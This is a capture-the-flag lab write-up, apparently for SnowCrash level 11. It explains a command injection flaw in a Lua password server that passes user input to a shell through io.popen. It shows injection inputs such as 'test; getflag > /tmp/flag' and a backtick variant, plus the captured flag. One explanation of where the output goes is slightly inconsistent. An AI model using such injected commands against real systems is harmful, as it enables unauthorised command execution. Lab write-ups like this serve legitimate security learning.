1. **File search**

    We have a `.lua` file that does the following:
    - Client connects via nc 127.0.0.1 5151
    - Server sends "Password: "
    - Client enters password (e.g: "hello")
    - Server executes: echo hello | sha1sum
    - Gets hash: 99500b06f4d5dde1... (40 characters)
    - Compares with f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
    - Since it doesn't match, sends "Erf nope.."
    - This is vulnerable to command injection.

    The key point is that the password variable (`pass`) is directly concatenated into the shell command:
    ```lua
    prog = io.popen("echo " .. pass .. " | sha1sum", "r")
    ```
    This means our input is evaluated by the shell. By injecting a special string, we can break out of the echo command and execute arbitrary commands as the `flag11` user (due to the SUID bit).

    For example, if we input:
    ```
    test; getflag
    ```
    The resulting command executed by the script will be:
    ```
    echo test; getflag | sha1sum
    ```
    This will print the output of `getflag` to the client connection, because `getflag` is executed as `flag11`.
    ```bash
    Password: test; getflag > /tmp/flag
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/flag
    .*( )*.
    woupa2yuojeeaaed06riuj63c
    ```
    We could also use: 
    ```bash
    `getflag` > /tmp/flag
    ```
    since it would execute the `getflag` command with `flag11` privileges first and the result would be saved to the `/tmp/flag` file, then it would continue with the sha1sum verification
    ```bash
    echo "getflag result" | sha1sum
    ```


